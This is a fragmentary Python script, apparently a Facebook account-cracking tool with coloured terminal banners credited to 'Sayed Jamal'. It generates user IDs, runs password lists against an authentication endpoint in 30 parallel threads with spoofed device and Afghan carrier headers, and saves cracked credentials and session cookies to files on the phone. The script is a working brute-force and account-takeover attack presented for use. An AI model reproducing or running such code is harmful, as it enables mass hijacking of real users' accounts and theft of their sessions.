...
\033[1;91m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ 
 ...
 \033[1;34m┃ [✓] Versoin \033[1;91m: \033[1;92m1.0 New 
 \033[1;34   
 \033[1;34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
def linex():
	print('\033[1;37m----------------------------------------------')
...
\033[1;91m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ 
 ...
 \033[1;34m┃ [✓] GITHUB    \033[1;91m: \033[1;92mERROR  
 \033[1;34m┃ [✓] FACEBOOK  \033[1;91m: \033[1;92mSayed Jamal  
 \033[1;34m┃ [✓] VERSION  \033[1;91m: \033[1;92m1.0 NEW
 \033[1;34   
 \033[1;34m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
def linex():
	print('\033[1;37m----------------------------------------------')
...
def AFG():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as JAMAL:	
			clear()
			tl = str(len(user))
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					JAMAL.submit(JAMAL1,ids,passlist)
		print('\033[1;37m')
		linex()
...
FHADIS1 = [ 'MTN', 'AWCC', 'Roshan', 'Etisalat']
FHADIS= random.choice(FHADIS1)
def JAMAL1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[37;41m [JAMAL➥HADIS]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        fblc = device['fblc']
                        fbcr = sim_id
                        Fjj=random.choice(FHADIS)
                        Fjjj=random.choice(FHADIS)
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        ...
                        s={'X-FB-Friendly-Name': 'authenticate', 
                        'X-FB-Net-HNI': '12602', 
                        'X-FB-SIM-HNI': '52644', 
                        ...
                        po = requests.post(url,data=data,s=s).json()
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[31;47m [HADIS==>OK]\33[0;m\033[1;32m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                        open('/sdcard/F-HADIS-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/F-HADIS-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[37;41m [HADIS==>CP]\33[0;m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        open('/sdcard/F-HADIS-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
